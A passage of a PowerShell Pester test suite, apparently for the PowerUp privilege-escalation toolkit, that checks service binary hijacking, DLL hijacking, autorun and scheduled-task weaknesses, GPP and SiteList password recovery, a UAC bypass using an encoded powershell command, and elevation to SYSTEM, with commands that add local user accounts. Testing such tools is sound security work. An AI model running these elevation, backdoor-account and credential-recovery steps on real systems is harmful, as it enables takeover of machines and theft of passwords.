            $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 3
            if ( -not ($(net localgroup Guests) -match 'PowerUp')) {
                Throw "Local user 'PowerUp' not created."
            }

            $Output = Restore-ServiceBinary -ServiceName PowerUpService
            "$(Get-Location)\powerup.exe.bak" | Should Not Exist
        }
        finally {
            $Null = $(net user PowerUp /delete >$Null 2>&1)
        }
    }

    It 'Should accept a custom command.' {
        try {
            $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Command "net user testing Password123! /add"
            $Output.Command | Should Match 'net'

            $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 3
            if ( -not ($(net user) -match "testing")) {
                Throw "Custom command failed."
            }
        
            $Output = Restore-ServiceBinary -ServiceName PowerUpService
            "$(Get-Location)\powerup.exe.bak" | Should Not Exist
        }
        finally {
            $Null = $(net user testing /delete >$Null 2>&1)
        }
    }
}

# TODO: Describe 'Restore-ServiceBinary' {}

########################################################
#
# PowerUp .dll hijacking functions.
#
########################################################

Describe 'Find-ProcessDLLHijack' {
    It 'Should return results.' {
        $Output = Find-ProcessDLLHijack
        $Output | Should Not BeNullOrEmpty
    }

    It 'Should accept a Process name on the pipeline.' {
        {'powershell' | Find-ProcessDLLHijack} | Should Not Throw
    }

    It 'Should accept a service object on the pipeline.' {
        {Get-Process powershell | Find-ProcessDLLHijack} | Should Not Throw
    }
}


Describe 'Find-PathDLLHijack' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Find-PathDLLHijack' Pester test needs local administrator privileges."
    }

    It 'Should find a hijackable %PATH% folder.' {

        New-Item -Path 'C:\PowerUpTest\' -ItemType directory -Force

        $OldPath = $Env:PATH
        $Env:PATH += ';C:\PowerUpTest\'

        $Output = Find-PathDLLHijack | Where-Object {$_.ModifiablePath -like "*PowerUpTest*"} | Select-Object -First 1

        $Env:PATH = $OldPath

        $Output.ModifiablePath | Should Be 'C:\PowerUpTest\'

        if ($Output.PSObject.Properties.Name -notcontains '%PATH%') {
            Throw "Find-PathDLLHijack result doesn't contain '%PATH%' field."
        }
        if ($Output.PSObject.Properties.Name -notcontains 'ModifiablePath') {
            Throw "Find-PathDLLHijack result doesn't contain 'ModifiablePath' field."
        }
        if ($Output.PSObject.Properties.Name -notcontains 'Permissions') {
            Throw "Find-PathDLLHijack result doesn't contain 'Permissions' field."
        }
        if ($Output.PSObject.Properties.Name -notcontains 'IdentityReference') {
            Throw "Find-PathDLLHijack result doesn't contain 'IdentityReference' field."
        }

        $Null = Remove-Item -Recurse -Force 'C:\PowerUpTest\' -ErrorAction SilentlyContinue
    }

    It "Should find a hijackable %PATH% folder that doesn't yet exist." {

        $OldPath = $Env:PATH
        $Env:PATH += ';C:\PowerUpTest\'

        $Output = Find-PathDLLHijack | Where-Object {$_.'%PATH%' -eq 'C:\PowerUpTest\'} | Select-Object -First 1

        $Env:PATH = $OldPath

        $Output.ModifiablePath | Should Be 'C:\'

        if ($Output.PSObject.Properties.Name -notcontains '%PATH%') {
            Throw "Find-PathDLLHijack result doesn't contain 'ModifiablePath' field."
        }
        if ($Output.PSObject.Properties.Name -notcontains 'ModifiablePath') {
            Throw "Find-PathDLLHijack result doesn't contain 'ModifiablePath' field."
        }
        if ($Output.PSObject.Properties.Name -notcontains 'Permissions') {
            Throw "Find-PathDLLHijack result doesn't contain 'Permissions' field."
        }
        if ($Output.PSObject.Properties.Name -notcontains 'IdentityReference') {
            Throw "Find-PathDLLHijack result doesn't contain 'IdentityReference' field."
        }
    }
}


Describe 'Write-HijackDll' {
    # won't actually execute on Win8+ with the wlbsctrl.dll method
    # TODO: write tests to properly cover parameter validation
    It 'Should write a .dll that executes a custom command.' {
        try {
            Write-HijackDll -DllPath "$(Get-Location)\powerup.dll" -Command 'net user testing Password123! /add'
            
            "$(Get-Location)\powerup.dll" | Should Exist
            "$(Get-Location)\debug.bat" | Should Exist
        }
        finally {
            $Null = Remove-Item -Path "$(Get-Location)\powerup.dll" -Force -ErrorAction SilentlyContinue
            $Null = Remove-Item -Path "$(Get-Location)\debug.bat" -Force -ErrorAction SilentlyContinue
        }
    }
}


########################################################
#
# PowerUp registry checks.
#
########################################################

Describe 'Get-RegistryAlwaysInstallElevated' {
    # TODO: set registry key, ensure it retrieves
    It 'Should not throw.' {
        {Get-RegistryAlwaysInstallElevated} | Should Not Throw
    }
}


Describe 'Get-RegistryAutoLogon' {
    # TODO: set a vulnerable autorun credential, ensure it retrieves
    It 'Should not throw.' {
        {Get-RegistryAutoLogon} | Should Not Throw
    }
}


Describe 'Get-ModifiableRegistryAutoRun' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-ModifiableRegistryAutoRun' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-ModifiableRegistryAutoRun} | Should Not Throw
    }

    It 'Should find a vulnerable autorun.' {
        try {
            $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
            $Null | Out-File -FilePath $FilePath -Force
            $Null = Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PowerUp -Value "vuln.exe -i '$FilePath'"

            $Output = Get-ModifiableRegistryAutoRun | Where-Object {$_.ModifiableFile -like "*$FilePath*"} | Select-Object -First 1

            $Output.ModifiableFile.ModifiablePath | Should Be $FilePath

            if ($Output.PSObject.Properties.Name -notcontains 'Key') {
                Throw "Get-ModifiableRegistryAutoRun result doesn't contain 'Key' field."
            }
            if ($Output.PSObject.Properties.Name -notcontains 'Path') {
                Throw "Get-ModifiableRegistryAutoRun result doesn't contain 'Path' field."
            }
            if ($Output.PSObject.Properties.Name -notcontains 'ModifiableFile') {
                Throw "Get-ModifiableRegistryAutoRun result doesn't contain 'ModifiableFile' field."
            }

            if ($Output.ModifiableFile.PSObject.Properties.Name -notcontains 'ModifiablePath') {
                Throw "Get-ModifiableRegistryAutoRun ModifiableFile result doesn't contain 'ModifiablePath' field."
            }
            if ($Output.ModifiableFile.PSObject.Properties.Name -notcontains 'Permissions') {
                Throw "Get-ModifiableRegistryAutoRun ModifiableFile result doesn't contain 'Permissions' field."
            }
            if ($Output.ModifiableFile.PSObject.Properties.Name -notcontains 'IdentityReference') {
                Throw "Get-ModifiableRegistryAutoRun ModifiableFile result doesn't contain 'IdentityReference' field."
            }

            $Null = Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PowerUp
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }
}


########################################################
#
# PowerUp misc. checks.
#
########################################################

Describe 'Get-ModifiableScheduledTaskFile' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-ModifiableScheduledTaskFile' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-ModifiableScheduledTaskFile} | Should Not Throw
    }

    It 'Should find a vulnerable config file for a binary specified in a schtask.' {
        try {
            $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
            $Null | Out-File -FilePath $FilePath -Force

            $Null = schtasks.exe /create /tn PowerUp /tr "vuln.exe -i '$FilePath'" /sc onstart /ru System /f

            $Output = Get-ModifiableScheduledTaskFile | Where-Object {$_.TaskName -eq 'PowerUp'} | Select-Object -First 1
            $Null = schtasks.exe /delete /tn PowerUp /f

            $Output.TaskFilePath.ModifiablePath | Should Be $FilePath

            if ($Output.PSObject.Properties.Name -notcontains 'TaskName') {
                Throw "Get-ModifiableScheduledTaskFile result doesn't contain 'TaskName' field."
            }
            if ($Output.PSObject.Properties.Name -notcontains 'TaskFilePath') {
                Throw "Get-ModifiableScheduledTaskFile result doesn't contain 'TaskFilePath' field."
            }
            if ($Output.PSObject.Properties.Name -notcontains 'TaskTrigger') {
                Throw "Get-ModifiableScheduledTaskFile result doesn't contain 'TaskTrigger' field."
            }

            if ($Output.TaskFilePath.PSObject.Properties.Name -notcontains 'ModifiablePath') {
                Throw "Get-ModifiableScheduledTaskFile TaskFilePath result doesn't contain 'ModifiablePath' field."
            }
            if ($Output.TaskFilePath.PSObject.Properties.Name -notcontains 'Permissions') {
                Throw "Get-ModifiableScheduledTaskFile TaskFilePath result doesn't contain 'Permissions' field."
            }
            if ($Output.TaskFilePath.PSObject.Properties.Name -notcontains 'IdentityReference') {
                Throw "Get-ModifiableScheduledTaskFile TaskFilePath result doesn't contain 'IdentityReference' field."
            }
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }
}


Describe 'Get-UnattendedInstallFile' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-UnattendedInstallFile' Pester test needs local administrator privileges."
    }

    It 'Should not throw.' {
        {Get-UnattendedInstallFile} | Should Not Throw
    }
    It 'Should return a leftover autorun' {
        $FilePath = Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"

        try {
            $Null | Out-File -FilePath $FilePath -Force
            $Output = Get-UnattendedInstallFile

            $Output | Should Not BeNullOrEmpty
        }
        finally {
            $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        }
    }
}


Describe 'Get-Webconfig' {
    It 'Should not throw.' {
        {Get-Webconfig} | Should Not Throw
    }
}


Describe 'Get-ApplicationHost' {
    It 'Should not throw.' {
        {Get-ApplicationHost} | Should Not Throw
    }
}

Describe 'Get-SiteListPassword' {
    BeforeEach {
        $Xml = '<?xml version="1.0" encoding="UTF-8"?><ns:SiteLists xmlns:ns="naSiteList" Type="Client"><SiteList Default="1" Name="SomeGUID"><HttpSite Type="fallback" Name="McAfeeHttp" Order="26" Enabled="1" Local="0" Server="update.nai.com:80"><RelativePath>Products/CommonUpdater</RelativePath><UseAuth>0</UseAuth><UserName></UserName><Password Encrypted="1">jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</Password></HttpSite><UNCSite Type="repository" Name="Paris" Order="13" Server="paris001" Enabled="1" Local="0"><ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount><DomainName>companydomain</DomainName><UserName>McAfeeService</UserName><Password Encrypted="0">Password123!</Password></UNCSite><UNCSite Type="repository" Name="Tokyo" Order="18" Server="tokyo000" Enabled="1" Local="0"><ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount><DomainName>companydomain</DomainName><UserName>McAfeeService</UserName><Password Encrypted="1">jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</Password></UNCSite></SiteList></ns:SiteLists>'
        $Xml | Out-File -FilePath "${Home}\SiteList.xml" -Force
    }
    AfterEach {
        Remove-Item -Force "${Home}\SiteList.xml"
    }

    It 'Should correctly find and parse a SiteList.xml file.' {

        $Credentials = Get-SiteListPassword
        
        $Credentials | Where-Object {$_.Name -eq 'McAfeeHttp'} | ForEach-Object {
            # HTTP site
            $_.Enabled | Should Be '1'
            $_.Server | Should Be 'update.nai.com:80'
            $_.Path | Should Be 'Products/CommonUpdater'
            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
            $_.DecPassword | Should Be 'MyStrongPassword!'
            $_.UserName | Should BeNullOrEmpty
            $_.DomainName | Should BeNullOrEmpty            
        } 
        
        $Credentials | Where-Object {$_.Name -eq 'Paris'} | ForEach-Object {
            # UNC site with unencrypted password
            $_.Enabled | Should Be '1'
            $_.Server | Should Be 'paris001'
            $_.Path | Should Be 'Repository$'
            $_.EncPassword | Should Be 'Password123!'
            $_.DecPassword | Should Be 'Password123!'
            $_.UserName | Should Be 'McAfeeService'
            $_.DomainName | Should Be 'companydomain'
        }

        $Credentials | Where-Object {$_.Name -eq 'Tokyo'} | ForEach-Object {
            # UNC site with encrypted password
            $_.Enabled | Should Be '1'
            $_.Server | Should Be 'tokyo000'
            $_.Path | Should Be 'Repository$'
            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
            $_.DecPassword | Should Be 'MyStrongPassword!'
            $_.UserName | Should Be 'McAfeeService'
            $_.DomainName | Should Be 'companydomain'
        }
    }

    It 'Should correctly parse a SiteList.xml on a specified path.' {
        
        $Credentials = Get-SiteListPassword -Path "${Home}\SiteList.xml"
        
        $Credentials | Where-Object {$_.Name -eq 'McAfeeHttp'} | ForEach-Object {
            # HTTP site
            $_.Enabled | Should Be '1'
            $_.Server | Should Be 'update.nai.com:80'
            $_.Path | Should Be 'Products/CommonUpdater'
            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
            $_.DecPassword | Should Be 'MyStrongPassword!'
            $_.UserName | Should BeNullOrEmpty
            $_.DomainName | Should BeNullOrEmpty            
        } 

        $Credentials | Where-Object {$_.Name -eq 'Paris'} | ForEach-Object {
            # UNC site with unencrypted password
            $_.Enabled | Should Be '1'
            $_.Server | Should Be 'paris001'
            $_.Path | Should Be 'Repository$'
            $_.EncPassword | Should Be 'Password123!'
            $_.DecPassword | Should Be 'Password123!'
            $_.UserName | Should Be 'McAfeeService'
            $_.DomainName | Should Be 'companydomain'
        }

        $Credentials | Where-Object {$_.Name -eq 'Tokyo'} | ForEach-Object {
            # UNC site with encrypted password
            $_.Enabled | Should Be '1'
            $_.Server | Should Be 'tokyo000'
            $_.Path | Should Be 'Repository$'
            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
            $_.DecPassword | Should Be 'MyStrongPassword!'
            $_.UserName | Should Be 'McAfeeService'
            $_.DomainName | Should Be 'companydomain'
        }
    }
}


Describe 'Get-CachedGPPPassword' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-CachedGPPPassword' Pester test needs local administrator privileges."
    }

    # all referenced GPP .xml sources from https://github.com/rapid7/metasploit-framework/blob/master/spec/lib/rex/parser/group_policy_preferences_spec.rb
    It 'Should throw if no files are found.' {
        Get-CachedGPPPassword | Should Throw
    }

    It 'Should correctly find and parse a cached Groups.xml file.' {
        $Path = "${Env:ALLUSERSPROFILE}\Microsoft\Group Policy\History\{23C4E89F-7D3A-4237-A61D-8EF82B5B9E42}\Machine\Preferences\Groups\Groups.xml"
        $Null = New-Item -ItemType File -Path $Path -Force
        $GroupsXml = '<?xml version="1.0" encoding="utf-8"?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="SuperSecretBackdoor" image="0" changed="2013-04-25 18:36:07" uid="{B5EDB865-34F5-4BD7-9C59-3AEB1C7A68C3}"><Properties action="C" fullName="" description="" cpassword="VBQUNbDhuVti3/GHTGHPvcno2vH3y8e8m1qALVO1H3T0rdkr2rub1smfTtqRBRI3" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="SuperSecretBackdoor"/></User></Groups>'
        $GroupsXml | Out-File -FilePath $Path -Force

        $GPPResult = Get-CachedGPPPassword
        Remove-Item -Force $Path

        $GPPResult.Passwords[0] | Should be 'Super!!!Password'
        $GPPResult.UserNames[0] | Should be 'SuperSecretBackdoor'
    }
}

# TODO: Describe 'Write-UserAddMSI' {}

Describe 'Invoke-WScriptUACBypass' {
    $OSVersion = [Environment]::OSVersion.Version
    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))) {
        It 'Should launch an elevated command.' {
            Invoke-WScriptUACBypass -Command 'powershell -enc JwAxADIAMwAnACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAcwBrAGEAZABqAGYAbgAuAHQAeAB0ACIA'
            if (-not (Test-Path -Path "C:\Windows\System32\skadjfn.txt")) {
                Throw "'Invoke-WScriptUACBypass' did not write a privileged file."
            }
            {Test-Path -Path "C:\Windows\System32\skadjfn.txt"} | Should Not Throw
            Remove-Item -Path "C:\Windows\System32\skadjfn.txt" -Force
        }

        It "Should accept -WindowStyle 'Visible'" {
            Invoke-WScriptUACBypass -Command notepad.exe -WindowStyle 'Visible'
            $Process = Get-Process 'notepad'
            $Process | Should Not BeNullOrEmpty
            $Process | Stop-Process -Force
        }
    }
    else {
        Write-Warning 'Target machine is not vulnerable to Invoke-WScriptUACBypass.'
    }
}

Describe 'Invoke-PrivescAudit' {
    It 'Should return results to stdout.' {
        $Output = Invoke-PrivescAudit
        $Output | Should Not BeNullOrEmpty
    }
    It 'Should produce a HTML report with -HTMLReport.' {
        $Output = Invoke-PrivescAudit -HTMLReport
        $Output | Should Not BeNullOrEmpty

        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"

        $HtmlReportFile | Should Exist
        $Null = Remove-Item -Path $HtmlReportFile -Force -ErrorAction SilentlyContinue
    }
}


Describe 'Get-System' {

    if (-not $(Test-IsAdmin)) {
        Throw "'Get-System' Pester test needs local administrator privileges."
    }

    AfterEach {
        Get-System -RevToSelf
    }

    It 'Should not throw with default parameters and should elevate to SYSTEM.' {
        { Get-System } | Should Not Throw
        "$([Environment]::UserName)" | Should Be 'SYSTEM'
    }

    It 'Named pipe impersonation should accept an alternate service and pipe name.' {
        { Get-System -Technique NamedPipe -ServiceName 'testing123' -PipeName 'testpipe' } | Should Not Throw
        "$([Environment]::UserName)" | Should Be 'SYSTEM'
    }

    It 'Should elevate to SYSTEM using token impersonation.' {
        { Get-System -Technique Token } | Should Not Throw
        "$([Environment]::UserName)" | Should Be 'SYSTEM'
    }

    It '-WhoAmI should display the current user.' {
        { Get-System -Technique Token } | Should Not Throw
        { Get-System -WhoAmI } | Should Match 'SYSTEM'
    }

    It 'RevToSelf should revert privileges.' {
        { Get-System -Technique Token } | Should Not Throw
        { Get-System -RevToSelf } | Should Not Throw
        "$([Environment]::UserName)" | Should Not Match 'SYSTEM'
    }

    It 'Token impersonation should throw with incompatible parameters.' {
        { Get-System -Technique Token -WhoAmI } | Should Throw
    }
}
